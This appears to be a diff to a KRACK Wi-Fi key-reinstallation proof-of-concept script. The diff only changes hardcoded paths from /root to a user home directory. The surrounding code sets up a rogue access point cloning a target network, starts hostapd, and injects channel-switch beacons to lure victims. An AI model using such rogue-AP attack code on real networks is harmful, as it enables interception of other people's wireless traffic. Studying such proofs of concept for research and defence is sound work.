@@ -357,7 +357,7 @@ class NetworkConfig():
 
 	def write_config(self, iface):
 		TEMPLATE = """
-ctrl_interface=/root/krackattacks-poc-zerokey/hostapd/hostapd_ctrl
+ctrl_interface=/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_ctrl
 ctrl_interface_group=root
 
 interface={iface}
@@ -926,10 +926,10 @@ class KRAckAttack():
 		# self.sock_rogue.attach_filter(bpf)
 
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
-		with open("/root/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "w") as fp:
+		with open("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
 
-		self.hostapd = subprocess.Popen("/root/krackattacks-poc-zerokey/hostapd/hostapd /root/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+		self.hostapd = subprocess.Popen("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
@@ -938,7 +938,7 @@ class KRAckAttack():
 		# when domain name (encode) to idna, label empty or too long error, 
 		# that is because domain name uses "." to split label,
 		# every label limited to longest 63 characters or no empty.
-		self.hostapd_ctrl = Ctrl("/root/krackattacks-poc-zerokey/hostapd/hostapd_ctrl/" + self.nic_rogue_ap) # "hostapd_ctrl/"
+		self.hostapd_ctrl = Ctrl("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_ctrl/" + self.nic_rogue_ap) # "hostapd_ctrl/"
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
